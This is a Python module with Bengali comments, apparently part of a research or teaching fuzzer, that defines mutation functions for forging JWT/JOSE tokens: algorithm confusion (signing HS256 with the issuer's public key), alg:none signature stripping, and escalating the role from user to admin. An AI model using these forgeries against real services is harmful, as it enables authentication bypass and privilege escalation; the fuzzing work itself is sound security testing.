"""
Mutations — DY mutation-এর JOSE সংস্করণ।
=========================================
প্রতিটা mutation একটা "attack recipe" নেয় (কীভাবে টোকেন বানানো হবে তার বর্ণনা)
আর সেটাকে বিকৃত করে। এগুলোই fuzzer-এর হাতিয়ার।

নিয়ম: mutation টোকেন-string সরাসরি ছোঁয় না — সে "recipe" বদলায়, তারপর
operator দিয়ে নতুন টোকেন বানানো হয়। এটাই DY-র "term বদলানো" দর্শন।
"""

from dataclasses import dataclass, field, replace
from typing import Optional
import operators as op


@dataclass
class Recipe:
    """একটা টোকেন কীভাবে বানানো হবে তার বর্ণনা (DY term-এর সরল রূপ)।"""
    alg: str = "HS256"
    role: str = "user"
    sign_key_kind: str = "issuer_secret"   # কোন key দিয়ে সাইন: issuer_secret / issuer_pubkey / attacker_secret
    drop_signature: bool = False           # signature ফেলে দেওয়া (alg:none-এর মতো)
    label: str = "seed"                    # কোন mutation থেকে এল (ট্র্যাকিং)


# ─────────────────────────────────────────────────────────────
# ৭টা mutation (worksheet Table 1-এর JOSE সংস্করণ)
# প্রতিটা একটা Recipe নেয়, একটা বদলানো Recipe ফেরত দেয়।
# ─────────────────────────────────────────────────────────────

def mut_replace_alg(r: Recipe, new_alg: str) -> Recipe:
    """Replace-Match: alg বদলানো (RS256→HS256 = Algorithm Confusion)।"""
    return replace(r, alg=new_alg, label=f"replace_alg→{new_alg}")

def mut_replace_key(r: Recipe, new_kind: str) -> Recipe:
    """Replace-Match: signing key বদলানো (issuer_pubkey দিয়ে সাইন = key confusion)।"""
    return replace(r, sign_key_kind=new_kind, label=f"replace_key→{new_kind}")

def mut_escalate_role(r: Recipe) -> Recipe:
    """payload-এর role বাড়ানো (user→admin)।"""
    return replace(r, role="admin", label="escalate_role")

def mut_drop_signature(r: Recipe) -> Recipe:
    """Skip: signature বাদ (alg:none আক্রমণের কাঁচামাল)।"""
    return replace(r, drop_signature=True, alg="none", label="drop_signature")


# ─────────────────────────────────────────────────────────────
# Recipe → আসল টোকেন string (operator জোড়া দিয়ে)
# ─────────────────────────────────────────────────────────────

def build_token(r: Recipe, keys: dict) -> str:
    """Recipe অনুযায়ী operator জোড়া দিয়ে টোকেন বানানো।"""
    header = op.fn_header(r.alg)
    payload = op.fn_payload(r.role)
    si = op.fn_signing_input(header, payload)

    if r.drop_signature:
        return op.fn_compact(header, payload, b"")     # signature খালি

    # কোন key দিয়ে সাইন করব
    if r.sign_key_kind == "issuer_secret":
        sig = op.fn_hmac_sign(si, key=keys["issuer_secret"])
    elif r.sign_key_kind == "attacker_secret":
        sig = op.fn_hmac_sign(si, key=keys["attacker_secret"])
    elif r.sign_key_kind == "issuer_pubkey":
        # ⚠️ Algorithm Confusion: public key কে HMAC secret বানানো
        sig = op.fn_hmac_sign(si, key=keys["issuer_pubkey_pem"])
    elif r.sign_key_kind == "issuer_private_rsa":
        sig = op.fn_rsa_sign(si, keys["issuer_priv"])
    else:
        raise ValueError(f"অজানা key kind: {r.sign_key_kind}")

    return op.fn_compact(header, payload, sig)
